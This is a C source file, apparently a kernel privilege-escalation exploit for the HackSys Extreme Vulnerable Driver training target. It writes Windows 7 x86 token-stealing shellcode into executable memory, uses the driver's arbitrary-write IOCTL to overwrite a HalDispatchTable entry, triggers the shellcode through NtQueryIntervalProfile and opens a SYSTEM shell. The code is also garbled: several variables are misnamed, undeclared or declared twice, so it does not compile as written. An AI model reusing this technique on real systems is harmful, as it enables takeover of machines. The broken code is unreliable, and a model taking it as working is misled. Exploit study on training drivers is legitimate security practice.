#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

typedef NTSTATUS(__stdcall *pNtQueryIntervalProfile)(
	ULONG ProfileSource,
	PULONG Interval
);

typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
);

#pragma comment(lib,"ntdll.lib")

FARPROC GetAddress(LPCSTR Sym)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	
	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD l;
	PSYSTEM_MODULE_INFORMATION Mi;
	LPVOID kBase = NULL;
	PUCHAR kImage = NULL;
	HMODULE UKrnl;
	FARPROC KSymb = NULL;
	FARPROC Add = NULL;
	LPCSTR KName = NULL;


	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");

	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &l);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, l, &l);

	kBase = ModuleInfo->Module[0].ImageBase;
	kImage = ModuleInfo->Module[0].FullPathName;

	KName = (LPCSTR)(Mi->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName);

	UKrnl = LoadLibraryExA(lpKernelName, 0, 0);

	KSym = GetProcAddress(Ukrnl, lpSymbolName);
	Add = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)UKrnl + (PUCHAR)kBase);

	FreeLibrary(UKrnl);
	VirtualFree(Mi, 0, MEM_RELEASE);

	return Add;
}

#define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	CHAR win7x86pl[] = "\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\xC3"
		;

	HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return -1;
	}
	LPVOID payload_ptr = NULL;
	LPCSTR Hal = "HalDispatchTable";
	FARPROC Where = NULL;
	LPVOID TargetAddress = NULL;
	LPVOID pl = VirtualAlloc(
		0,
		sizeof(win7x86pl),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pl, win7x86pl, sizeof(win7x86pl));
	LPVOID TargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	TargetAddress = &pl;
	Where = GetAddress(Hal);
	Write = (LPVOID)((ULONG)TargetAddress + 0x4);
	auto Buff = (PUCHAR)malloc(sizeof(PUCHAR) * 2);
	memcpy(Buff, &Write, 4);
	memcpy(Buff + 4, &Where, 4);
	DWORD u = 0;                   

	auto bResult = DeviceIoControl(
		dev,	
		0x22200B,			
		chOverwriteBuffer, 8,		
		NULL, 0,		
		&u,			
		(LPOVERLAPPED)NULL
	);	

	pNtQueryIntervalProfile NtQueryIntervalProfile = (pNtQueryIntervalProfile)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	NtQueryIntervalProfile(0xa77b, &u);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}

